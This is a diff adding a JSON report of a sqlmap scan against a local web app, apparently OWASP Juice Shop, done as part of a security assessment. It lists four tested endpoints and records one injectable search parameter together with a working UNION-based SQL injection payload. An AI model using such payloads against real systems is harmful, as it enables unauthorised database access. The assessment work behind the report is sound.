@@ -1,0 +1,44 @@
+{
+  "executed": true,
+  "binary": "/home/user/.local/bin/sqlmap",
+  "version": "1.10.11#pip",
+  "targetsTested": [
+    {
+      "url": "http://localhost:3000/rest/products/search",
+      "method": "GET",
+      "returncode": 0,
+      "injectableCount": 0
+    },
+    {
+      "url": "http://localhost:3000/rest/user/login",
+      "method": "POST",
+      "returncode": 0,
+      "injectableCount": 0
+    },
+    {
+      "url": "http://localhost:3000/rest/products/search",
+      "method": "GET",
+      "returncode": 0,
+      "injectableCount": 1
+    },
+    {
+      "url": "http://localhost:3000/rest/user/change-password",
+      "method": "GET",
+      "returncode": 0,
+      "injectableCount": 0
+    }
+  ],
+  "injectableParameters": [
+    {
+      "url": "http://localhost:3000/rest/products/search",
+      "method": "GET",
+      "parameter": "q",
+      "place": "GET",
+      "technique": "UNION query",
+      "title": "Generic UNION query (NULL) - 10 columns",
+      "payload": "q=')) UNION ALL SELECT CONCAT(CONCAT('qbpjq','DQDNkxShHkEtAhdUfllaVQWzDfTRfmTOCzRHDozt'),'qxzzq'),13,13,13,13,13,13,13,13,13-- wmkj"
+    }
+  ],
+  "errors": [],
+  "reportPath": "/home/user/felipe/speckit/casa/casa-assessment/output/azi03-sqlmap-report.json"
+}
